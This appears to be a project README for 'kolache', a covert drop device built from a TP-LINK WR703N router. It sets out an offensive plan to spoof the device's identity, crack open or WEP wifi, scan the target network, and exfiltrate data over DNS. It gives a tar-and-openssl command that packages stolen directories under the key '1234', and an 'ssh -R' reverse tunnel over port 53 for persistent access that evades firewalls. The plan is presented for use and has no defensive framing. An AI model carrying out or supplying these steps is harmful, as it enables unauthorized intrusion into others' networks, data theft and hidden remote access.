kolache
=======

Description
----
Create open source wifi-pineapple with the TP-LINK TL-WR703N

Installation/Build Instructions
----

Additional Info and Links
----
applications needed on router for dns exfil:

[dig] (https://hackucf.org/blog/hack-all-the-things-exfiltrating-data-via-dns-requests/)

[xxd] (http://jontai.me/blog/2011/11/monitoring-dns-queries-with-tcpdump/)


1.) External drive will be encrypted. 

> http://oneitguy.com/blog/encrypted-remote-backup-openwrt

> https://dev.openwrt.org/ticket/10787

> http://gui-at.blogspot.com/2010/02/disk-encryption-in-openwrt.html

> http://sjoosten.nl/2013/06/luks-usb-stick.html

2.) Console into the router via Ethernet before 'drop off'.

2.1) Mount the SD card via SSH with encryption password. 

3.) Run a script that changes the device host name and mac address to something like an apple iphone/ipad or samsung android device. 

3.1) Set up the device for monitoring in a given number minutes.

4.) The WR-703N will scans for available wifi networks. It will find unencrypted wifi or WEP and crack them.
  
5.) Once on the target network, does an arp scan / nmap of hosts and other 'fun things' (Navy).

6.) The WR-703N will find its way to internet.

7.) The WR-703N will exfil some data. All data should be encrypted with openssl before exfiltration.

> tar -P -zcf - $dirname | openssl aes-128-cbc -out $dirname.tar.gz -k 1234

(tar/gzip everything in a given directory. AES-128 encrpt file. set the password to the file as "1234")


8.) The WR-703N will open a reverse SSH shell into the target network. 
> ssh -R 53:localhost:22 sourceuser@public ip

> tunnel through port 53 (because it it is normally unblocked)

9.) Lastly, win... (Navy/Russ)
